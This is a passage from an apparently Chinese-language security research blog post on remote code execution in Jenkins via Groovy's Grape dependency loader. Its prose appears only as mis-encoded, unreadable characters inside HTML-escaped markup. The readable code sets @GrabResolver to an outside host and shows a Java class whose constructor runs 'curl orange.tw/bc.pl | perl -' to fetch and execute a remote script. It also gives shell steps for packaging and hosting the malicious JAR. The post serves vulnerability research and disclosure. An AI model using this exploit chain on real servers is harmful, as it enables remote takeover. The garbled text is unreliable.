&lt;p&gt;èªçœŸè¿½äº†ä¸€ä¸‹ root cause æ‰ç™¼ç¾æ˜¯ &lt;a href=&quot;https://wiki.jenkins.io/display/JENKINS/Pipeline+Shared+Groovy+Libraries+Plugin&quot;&gt;Pipeline Shared Groovy Libraries Plugin&lt;/a&gt; é€™å€‹æ’ä»¶åœ¨ä½œæ€ª! ç‚ºäº†æ–¹ä¾¿ä½¿ç”¨è€…å¯é‡è¤‡ä½¿ç”¨åœ¨ç·¨å¯« Pipeline å¸¸ç”¨åˆ°çš„åŠŸèƒ½ï¼ŒJenkins æä¾›äº†é€™å€‹æ’ä»¶å¯åœ¨ Pipeline ä¸­å¼•å…¥è‡ªå®šç¾©çš„å‡½å¼åº«! Jenkins æœƒåœ¨æ‰€æœ‰ Pipeline åŸ·è¡Œå‰å¼•å…¥é€™å€‹å‡½å¼åº«ï¼Œè€Œåœ¨ç·¨è­¯æ™‚æœŸçš„ classPath ä¸­ä¸¦æ²’æœ‰ç›¸å°æ‡‰çš„å‡½å¼åº«å› è€Œå°è‡´äº†é€™å€‹éŒ¯èª¤!&lt;/p&gt;

&lt;p&gt;æƒ³è§£æ±ºé€™å€‹å•é¡Œå¾ˆç°¡å–®ï¼Œåˆ° &lt;a href=&quot;http://jenkins.local/pluginManager/&quot;&gt;Jenkins Plugin Manager&lt;/a&gt; ä¸­å°‡ &lt;a href=&quot;https://wiki.jenkins.io/display/JENKINS/Pipeline+Shared+Groovy+Libraries+Plugin&quot;&gt;Pipeline Shared Groovy Libraries Plugin&lt;/a&gt; ç§»é™¤å³å¯è§£æ±ºé€™å€‹å•é¡Œä¸¦åŸ·è¡Œä»»æ„ä»£ç¢¼!&lt;/p&gt;

&lt;p&gt;ä¸éé€™çµ•å°ä¸æ˜¯æœ€ä½³è§£! é€™å€‹æ’ä»¶æœƒéš¨è‘— Pipeline è¢«è‡ªå‹•å®‰è£ï¼Œç‚ºäº†è¦æˆåŠŸåˆ©ç”¨é€™å€‹æ¼æ´é‚„å¾—å…ˆè¦æ±‚ç®¡ç†å“¡æŠŠå®ƒç§»é™¤å¯¦åœ¨å¤ªè ¢äº†! å› æ­¤é€™æ¢è·¯åªèƒ½å…ˆæ‰“ä½ï¼Œç¹¼çºŒå°‹æ‰¾ä¸‹ä¸€å€‹æ–¹æ³•!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;å†æ¬¡å˜—è©¦&quot;&gt;å†æ¬¡å˜—è©¦&lt;/h3&gt;
&lt;hr /&gt;

&lt;p&gt;ç¹¼çºŒé–±è®€ &lt;a href=&quot;http://groovy-lang.org/metaprogramming.html&quot;&gt;Groovy Meta-Programming æ‰‹å†Š&lt;/a&gt;ï¼Œæˆ‘å€‘ç™¼ç¾äº†å¦ä¸€å€‹æœ‰è¶£çš„è¨»è§£ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@Grab&lt;/code&gt;ï¼Œé—œæ–¼ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@Grab&lt;/code&gt; æ‰‹å†Šä¸­ä¸¦æ²’æœ‰è©³ç´°çš„æè¿°ï¼Œä½†ä½¿ç”¨ Google æˆ‘å€‘ç™¼ç¾äº†å¦ä¸€ç¯‡æ–‡ç«  - &lt;a href=&quot;http://docs.groovy-lang.org/latest/html/documentation/grape.html&quot;&gt;Dependency management with Grape&lt;/a&gt;!&lt;/p&gt;

&lt;p&gt;åŸä¾† Grape(&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@Grab&lt;/code&gt;) æ˜¯ä¸€å€‹ Groovy å…§å»ºçš„å‹•æ…‹ JAR ç›¸ä¾æ€§ç®¡ç†ç¨‹å¼! å¯è®“é–‹ç™¼è€…å‹•æ…‹çš„å¼•å…¥ä¸åœ¨ classPath ä¸Šçš„å‡½å¼åº«! Grape çš„èªæ³•å¦‚ä¸‹:&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nd&quot;&gt;@Grab&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;org.springframework&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;spring-orm&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;3.2.5.RELEASE&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.jdbc.core.JdbcTemplate&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;é…åˆ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@grab&lt;/code&gt; çš„è¨»è§£ï¼Œå¯è®“ Groovy åœ¨ç·¨è­¯æ™‚æœŸè‡ªå‹•å¼•å…¥ä¸å­˜åœ¨æ–¼ classPath ä¸­çš„ JAR æª”! ä½†å¦‚æœä½ çš„ç›®çš„åªæ˜¯è¦åœ¨ä¸€å€‹æœ‰åŸ·è¡Œ Pipeline æ¬Šé™çš„å¸³è™Ÿä¸Šç¹éåŸæœ‰ Pipeline çš„ Sandbox çš„è©±ï¼Œé€™å…¶å¯¦å°±è¶³å¤ äº†! ä¾‹å¦‚ä½ å¯ä»¥åƒè€ƒ &lt;a href=&quot;https://github.com/adamyordan&quot;&gt;@adamyordan&lt;/a&gt; æ‰€æä¾›çš„ &lt;a href=&quot;https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc&quot;&gt;PoC&lt;/a&gt;ï¼Œåœ¨å·²çŸ¥ä½¿ç”¨è€…å¸³è™Ÿèˆ‡å¯†ç¢¼åŠæ¬Šé™è¶³å¤ çš„æƒ…æ³ä¸‹ï¼Œé”åˆ°é ç«¯ä»£ç¢¼åŸ·è¡Œçš„æ•ˆæœ!&lt;/p&gt;

&lt;p&gt;ä½†åœ¨æ²’æœ‰å¸³è™Ÿå¯†ç¢¼åŠ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execute()&lt;/code&gt; çš„æ–¹æ³•ä¸‹ï¼Œé€™åªæ˜¯ä¸€å€‹ç°¡å–®çš„èªæ³•æ¨¹è§£æå™¨ï¼Œä½ ç”šè‡³ç„¡æ³•æ§åˆ¶é ç«¯ä¼ºæœå™¨ä¸Šçš„æª”æ¡ˆï¼Œæ‰€ä»¥è©²æ€éº¼è¾¦å‘¢? æˆ‘å€‘ç¹¼çºŒç ”ç©¶ä¸‹å»ï¼Œä¸¦ç™¼ç¾äº†ä¸€å€‹å¾ˆæœ‰è¶£çš„è¨»è§£å«åš &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@GrabResolver&lt;/code&gt;ï¼Œç”¨æ³•å¦‚ä¸‹:&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nd&quot;&gt;@GrabResolver&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;restlet&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;http://maven.restlet.org/&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nd&quot;&gt;@Grab&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;org.restlet&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;org.restlet&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;1.1.6&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.restlet&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;çœ‹åˆ°é€™å€‹ï¼Œè°æ˜çš„ä½ æ‡‰è©²æœƒå¾ˆæƒ³æŠŠ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; æ”¹æˆæƒ¡æ„ç¶²å€å°å§! æˆ‘å€‘ä¾†è©¦è©¦æœƒæ€éº¼æ¨£å§!&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;classLoader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;parseClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;&apos;&apos;
@GrabResolver(name=&apos;restlet&apos;, root=&apos;http://orange.tw/&apos;)
@Grab(group=&apos;org.restlet&apos;, module=&apos;org.restlet&apos;, version=&apos;1.1.6&apos;)
import org.restlet
&apos;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;pre&gt;&lt;code class=&quot;language-log&quot;&gt;11.22.33.44 - - [18/Dec/2018:18:56:54 +0800] &quot;HEAD /org/restlet/org.restlet/1.1.6/org.restlet-1.1.6-javadoc.jar HTTP/1.1&quot; 404 185 &quot;-&quot; &quot;Apache Ivy/2.4.0&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;å–”å¹¹ï¼ŒçœŸçš„æœƒä¾†å­˜å–æ¬¸! åˆ°é€™è£¡æˆ‘å€‘å·²ç¶“ç¢ºä¿¡äº†é€é Grape å¯ä»¥è®“ Jenkins å¼•å…¥æƒ¡æ„çš„å‡½å¼åº«! ä½†ä¸‹ä¸€å€‹å•é¡Œæ˜¯ï¼Œè¦å¦‚ä½•åŸ·è¡Œä»£ç¢¼å‘¢?&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;å¦‚ä½•åŸ·è¡Œä»»æ„ä»£ç¢¼&quot;&gt;å¦‚ä½•åŸ·è¡Œä»»æ„ä»£ç¢¼?&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;åœ¨æ¼æ´çš„åˆ©ç”¨ä¸­ç¸½æ˜¯åœ¨ç ”ç©¶å¦‚ä½•å¾ç°¡å–®çš„ä»»æ„è®€ã€ä»»æ„å¯«åˆ°å–å¾—ç³»çµ±åŸ·è¡Œçš„æ¬Šé™! å¾å‰é¢çš„ä¾‹å­ä¸­ï¼Œæˆ‘å€‘å·²ç¶“å¯ä»¥é€é Grape å»å¯«å…¥æƒ¡æ„çš„ JAR æª”åˆ°é ç«¯ä¼ºæœå™¨ï¼Œä½†è¦æ€éº¼åŸ·è¡Œé€™å€‹ JAR æª”å‘¢? é€™åˆæ˜¯å¦ä¸€å€‹å•é¡Œ!&lt;/p&gt;

&lt;p&gt;è·Ÿé€² Groovy èªè¨€æ ¸å¿ƒæŸ¥çœ‹å°æ–¼ &lt;a href=&quot;https://github.com/groovy/groovy-core/blob/master/src/main/groovy/grape/Grape.java&quot;&gt;Grape çš„å¯¦ä½œ&lt;/a&gt;ï¼Œæˆ‘å€‘çŸ¥é“ç¶²è·¯å±¤çš„æŠ“å–æ˜¯é€é &lt;a href=&quot;https://github.com/groovy/groovy-core/blob/master/src/main/groovy/grape/GrapeIvy.groovy&quot;&gt;groovy.grape.GrapeIvy&lt;/a&gt; é€™å€‹é¡åˆ¥ä¾†å®Œæˆ! æ‰€ä»¥é–‹å§‹å°‹æ‰¾å¯¦ä½œä¸­æ˜¯å¦æœ‰ä»»ä½•å¯ä»¥åŸ·è¡Œä»£ç¢¼çš„æ©Ÿæœƒ! å…¶ä¸­ï¼Œæˆ‘å€‘çœ‹åˆ°äº†ä¸€å€‹æœ‰è¶£çš„æ–¹æ³• - &lt;a href=&quot;https://github.com/groovy/groovy-core/blob/GROOVY_2_4_3/src/main/groovy/grape/GrapeIvy.groovy#L312&quot;&gt;processOtherServices(â€¦)&lt;/a&gt;:&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;processOtherServices&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ClassLoader&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;loader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;File&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;ZipFile&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ZipFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;ZipEntry&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serializedCategoryMethods&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getEntry&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;META-INF/services/org.codehaus.groovy.runtime.SerializedCategoryMethods&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serializedCategoryMethods&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;processSerializedCategoryMethods&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;zf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getInputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serializedCategoryMethods&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;ZipEntry&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pluginRunners&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getEntry&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;META-INF/services/org.codehaus.groovy.plugins.Runners&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pluginRunners&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;processRunners&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;zf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getInputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pluginRunners&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;loader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ZipException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ignore&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// ignore files we can&apos;t process, e.g. non-jar/zip artifacts&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// TODO log a warning&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ç”±æ–¼ JAR æª”æ¡ˆå…¶å¯¦å°±æ˜¯ä¸€å€‹ ZIP å£“ç¸®æ ¼å¼çš„å­é›†ï¼ŒGrape æœƒæª¢æŸ¥æª”æ¡ˆä¸­æ˜¯å¦å­˜åœ¨ä¸€äº›æŒ‡å®šçš„å…¥å£é»ï¼Œå…¶ä¸­ä¸€å€‹ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Runner&lt;/code&gt; çš„å…¥å£é»æª¢æŸ¥å¼•èµ·äº†æˆ‘å€‘çš„èˆˆè¶£ï¼ŒæŒçºŒè·Ÿé€² &lt;a href=&quot;https://github.com/groovy/groovy-core/blob/GROOVY_2_4_3/src/main/groovy/grape/GrapeIvy.groovy#L335&quot;&gt;processRunners(â€¦)&lt;/a&gt; çš„å¯¦ä½œæˆ‘å€‘ç™¼ç¾:&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;processRunners&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InputStream&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;is&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ClassLoader&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;loader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;is&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;readLines&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;GroovySystem&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;RUNNER_REGISTRY&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;loader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;loadClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;it&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;trim&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;newInstance&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;é€™è£¡çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;newInstance()&lt;/code&gt; ä¸å°±ä»£è¡¨è‘—å¯ä»¥å‘¼å«åˆ°ä»»æ„é¡åˆ¥çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Constructor&lt;/code&gt; å—? æ²’éŒ¯! æ‰€ä»¥åªéœ€ç”¢ç”Ÿä¸€å€‹æƒ¡æ„çš„ JAR æª”ï¼ŒæŠŠè¦åŸ·è¡Œçš„é¡åˆ¥å…¨åæ”¾è‡³ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;META-INF/services/org.codehaus.groovy.plugins.Runners&lt;/code&gt; ä¸­å³å¯å‘¼å«æŒ‡å®šé¡åˆ¥çš„&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Constructor&lt;/code&gt; å»åŸ·è¡Œä»»æ„ä»£ç¢¼! å®Œæ•´çš„æ¼æ´åˆ©ç”¨éç¨‹å¦‚ä¸‹:&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Orange&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;Orange&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(){&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;curl orange.tw/bc.pl | perl -&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/bash&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;-c&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;};&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;java&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;lang&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;Runtime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getRuntime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmds&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;javac Orange.java
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; META-INF/services/
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;Orange &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; META-INF/services/org.codehaus.groovy.plugins.Runners
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
./Orange.java
./Orange.class
./META-INF
./META-INF/services
./META-INF/services/org.codehaus.groovy.plugins.Runners

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;jar cvf poc-1.jar tw/
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cp &lt;/span&gt;poc-1.jar ~/www/tw/orange/poc/1/
